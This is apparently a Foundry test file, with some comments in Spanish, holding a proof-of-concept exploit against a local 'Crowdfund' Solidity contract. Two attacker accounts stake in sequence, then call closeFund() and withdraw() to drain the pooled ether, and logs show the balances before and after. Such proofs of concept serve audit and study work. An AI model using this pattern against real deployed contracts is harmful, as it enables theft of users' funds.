// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "@forge-std/Test.sol";
import {Crowdfund} from "../src/Crowdfund.sol";

contract ProofOfConcept is Test {

    Crowdfund public crowdfundContract;

    address public owner = makeAddr("owner");
    address public user1 = makeAddr("user1");
    address public user2 = makeAddr("user2");
    address public user3 = makeAddr("user3");
    address public user4 = makeAddr("user4");
    address public user5 = makeAddr("user5");
    address public attacker1 = makeAddr("attacker1");
    address public attacker01 = makeAddr("attacker01");

    // La función setUp() es ejecutada antes de cada test para establecer el escenario inicial
    function setUp() public {
        // Aumentamos el balance de cada usuario
        vm.deal(owner, 1000 ether);
        vm.deal(user1, 1000 ether);
        vm.deal(user2, 1000 ether);
        vm.deal(user3, 1000 ether);
        vm.deal(user4, 1000 ether);
        vm.deal(user5, 1000 ether);
        vm.deal(attacker1, 1000 ether);
        vm.deal(attacker01, 1000 ether);

        // El owner despliega el contrato
        vm.prank(owner);
        crowdfundContract = new Crowdfund();
    }


    function test_exploit() public {
        
        console.log("--------------------------------------------------------------------------");
        console.log(unicode"\n\tLet's simulate the stake of different crowdfunding participants\n");
        console.log("--------------------------------------------------------------------------");
        
        stake(user1, 29 ether);
        stake(user2, 27 ether);
        stake(user3, 30 ether);
        stake(user4, 58 ether);
        stake(user5, 63 ether);
        stake(user1, 68 ether);
        stake(user2, 67 ether);
        stake(user3, 69 ether);
        stake(user4, 70 ether);
        stake(user5, 72 ether);
        
        console.log("--------------------------------------------------------------------------\n"); 
        console.log(unicode"| => Funds on stake (crowdfund's balance): 👀 %s ether👀", crowdfundContract.getTotalStake()/1 ether);
        console.log(unicode"| => Attacker's balance                  : 👀 %s ether👀", address(attacker1).balance/1 ether);
        console.log(unicode"| => Attacker01's balance                : 👀 %s ether👀\n", address(attacker01).balance/1 ether);
        console.log("--------------------------------------------------------------------------"); 

        console.log(unicode"\n\t\t\t💥💥💥💥 EXPLOITING... 💥💥💥💥\n"); 

        exploit();

        console.log("--------------------------------------------------------------------------\n"); 
        console.log(unicode"| => Funds on stake (crowdfund's balance): ☠  %s ether☠", crowdfundContract.getTotalStake()/1 ether);
        console.log(unicode"| => Attacker's balance                  : 💯 %s ether💯", address(attacker1).balance/1 ether);
        console.log(unicode"| => Attacker01's balance                : 💯 %s ether💯\n", address(attacker01).balance/1 ether);
        console.log("--------------------------------------------------------------------------");             
    }
    
    function stake(address user, uint amount) internal {
        vm.prank(user);
        crowdfundContract.stake{value: amount}();
        console.log(unicode"| => Address: %s Stake: %s ether |", address(user), amount/1 ether);
    }

    function exploit() internal {
        vm.prank(attacker01);
        crowdfundContract.stake{value: 95 ether}();
        vm.prank(attacker1);
        crowdfundContract.stake{value: 90 ether}();
        vm.prank(attacker1);
        crowdfundContract.stake{value: 95 ether}();
        vm.prank(attacker01);
        crowdfundContract.stake{value: 95 ether}();
        vm.prank(attacker1);
        crowdfundContract.stake{value: 72 ether}();

        vm.prank(attacker1);
        crowdfundContract.closeFund();
        vm.prank(attacker1);
        crowdfundContract.withdraw();
        
    }

}